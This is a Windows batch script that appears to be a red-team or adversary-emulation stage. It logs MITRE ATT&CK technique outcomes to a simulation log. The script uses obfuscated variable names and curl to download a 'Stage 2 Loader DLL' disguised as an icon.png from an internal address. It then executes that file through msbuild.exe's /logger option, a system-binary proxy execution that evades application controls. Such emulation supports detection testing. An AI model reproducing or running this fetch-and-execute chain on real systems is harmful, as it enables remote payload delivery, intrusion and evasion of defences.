@echo off
setlocal enabledelayedexpansion

REM Obfuscated SET variable preamble - each PHR literal appears once
SET akjdh=%APPDATA%\7\macula-simulations.log
SET mnbvf=%APPDATA%\10341\0edd4cc6
SET qwzxc=190cc4bb.txt
SET plkmj=%APPDATA%\7
SET vbnmc=https://10.0.0.49/stage/2/icon.png?10341-7
SET ghzxp=ITZEL-S2BO
SET zxcvb=10341
SET qwert=7

REM Derive log file path from %APPDATA%\7\macula-simulations.log placeholder
SET asdfg=!akjdh!

REM Ensure log file directory exists
for %%i in ("!asdfg!") do if not exist "%%~dpi" mkdir "%%~dpi" 2>nul

REM Cache timestamp once
SET tsvar=!DATE!/!TIME!

REM ============================================
REM DEBUG: starting heartbeat download
REM ============================================
echo [!tsvar!][DEBUG][!ghzxp!][!zxcvb!]: heartbeat_start>> "!asdfg!" 2>nul

REM Download Stage 2 Loader DLL via curl
curl -k -s -o "!mnbvf!\!qwzxc!" "!vbnmc!" >nul 2>&1
SET curlerr=!ERRORLEVEL!

REM ============================================
REM DEBUG: heartbeat complete / check result
REM ============================================
if !curlerr! equ 0 (
    echo [!tsvar!][DEBUG][!ghzxp!][!zxcvb!]: heartbeat_complete=!curlerr!>> "!asdfg!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!ghzxp!][!zxcvb!]: heartbeat_failed=!curlerr!>> "!asdfg!" 2>nul
)

REM Change to output directory
echo [!tsvar!][DEBUG][!ghzxp!][!zxcvb!]: chdir_start>> "!asdfg!" 2>nul
cd /d "!mnbvf!" >nul 2>&1
SET chdirerr=!ERRORLEVEL!
echo [!tsvar!][DEBUG][!ghzxp!][!zxcvb!]: chdir_result=!chdirerr!>> "!asdfg!" 2>nul

REM ============================================
REM Create minimal .proj file for msbuild
REM ============================================
echo ^<Project/^> > "!mnbvf!\build.proj"
echo [!tsvar!][DEBUG][!ghzxp!][!zxcvb!]: proj_created>> "!asdfg!" 2>nul

REM ============================================
REM Execute Stage 2 Loader via msbuild.exe /logger: (LOLBIN)
REM ============================================
echo [!tsvar!][DEBUG][!ghzxp!][!zxcvb!]: msbuild_start>> "!asdfg!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe "!mnbvf!\build.proj" /logger:LoggerEntry,"!mnbvf!\!qwzxc!";MyParameters,Foo >NUL 2>&1
SET msbuilderr=!ERRORLEVEL!
echo [!tsvar!][DEBUG][!ghzxp!][!zxcvb!]: msbuild_result=!msbuilderr!>> "!asdfg!" 2>nul

REM ============================================
REM TTP logging
REM ============================================
REM T1218: System Binary Proxy Execution (msbuild.exe /logger:)
if !msbuilderr! equ 0 (
    echo [!tsvar!][TTP][!ghzxp!][!zxcvb!]: T1218^|System Binary Proxy Execution=[OK]:[]>> "!asdfg!" 2>nul
) else (
    echo [!tsvar!][TTP][!ghzxp!][!zxcvb!]: T1218^|System Binary Proxy Execution=[FAIL]:[msbuild_exit_nonzero]>> "!asdfg!" 2>nul
)

REM T1027: Obfuscated Files or Information (script structure itself)
echo [!tsvar!][TTP][!ghzxp!][!zxcvb!]: T1027^|Obfuscated Files or Information=[OK]:[]>> "!asdfg!" 2>nul

endlocal